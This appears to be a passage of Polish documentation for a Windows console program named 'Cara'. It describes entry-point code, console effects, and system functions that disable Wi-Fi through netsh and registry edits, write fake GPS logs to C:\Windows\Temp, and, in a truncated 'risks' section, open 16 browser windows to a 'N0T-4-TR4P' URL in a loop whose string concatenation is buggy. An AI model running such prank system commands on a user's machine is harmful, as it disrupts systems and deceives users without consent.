2. Szczegóły Implementacyjne
2.1 maincore.cpp - Rdzeń Aplikacji
WinMain vs main()
Konwencja APIENTRY:

cpp
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
Główny punkt wejścia dla aplikacji Windows GUI. Parametry:

hInstance: Instancja aplikacji

lpCmdLine: Argumenty wiersza poleceń (np. "schedule add 2023-10-31 20:00 Spotkanie")

AllocConsole(): Dynamicznie tworzy konsolę dla interfejsu tekstowego.

SetConsoleOutputCP(CP_UTF8): Aktywuje obsługę znaków specjalnych (np. emotikony).

Cykl Życia Aplikacji
Weryfikacja uprawnień administratorskich (IsRunAsAdmin()).

Inicjalizacja konsoli i przekierowanie strumieni I/O.

Wyświetlenie ekranu ładowania (show_loading()) i logo.

Główna pętla komend: analiza wejścia użytkownika i wywołanie odpowiednich funkcji.

3.1.2 Metody Kluczowe
print_slowly():

cpp
void print_slowly(const string& text, unsigned int delay = 30) {
    for (char c : text) {
        cout << c << flush;
        Sleep(delay);  // Efekt "pisania"
    }
}
Użycie: Animuje wypisywanie tekstu (np. powitanie "Hello! I'm Cara...").

4. Integracja z Systemem
4.1 Operacje Sieciowe
enable_airplane_mode()
cpp
void enable_airplane_mode() {
    // Modyfikacja rejestru
    system("powershell -Command \"Set-ItemProperty ... \"");
    // Wyłączenie interfejsów
    system("netsh interface set interface \"Wi-Fi\" admin=disable");
}
Efekty:

Tworzy klucz rejestru HKLM\SYSTEM\CurrentControlSet\Control\RadioManagement\SystemRadioState

Loguje operacje do C:\Windows\Temp\airplane_log.txt

activate_bluetooth()
Wykorzystuje devcon.exe (narzędzie Microsoft) do aktywacji urządzeń Bluetooth.

Logi: bluetooth_log.txt w dwóch lokalizacjach (tymczasowej i embedowanej).

4.2 Efekty Specjalne
initiate_black_mirror()
cpp
void initiate_black_mirror() {
    for (int i = 0; i < 150; i++) {
        SetConsoleTextAttribute(hConsole, rand() % 256);  // Losowy kolor
        cout << static_cast<char>(rand() % 94 + 33);  // Znaki ASCII 33-126
        Beep(rand() % 2000 + 37, 50);  // Sygnały dźwiękowe
    }
}
Cel: Symulacja "ataku hakerskiego" z efektem wizualnym i dźwiękowym.

execute_spectral_broadcast()
Miganie konsoli (system("color 0A")).

Odtwarzanie pliku c1337.mp3 lub sygnałów Beep().

Zapis fałszywych współrzędnych GPS do C:\Windows\Temp\location.log.

5. Bezpieczeństwo i Kontrowersje
5.1 Ryzyka

cpp

cpp
for (int i = 1; i <= 16; i++) {
    launchProcess("cmd /c start https://void.domain/N0T-4-TR4P-" + i);
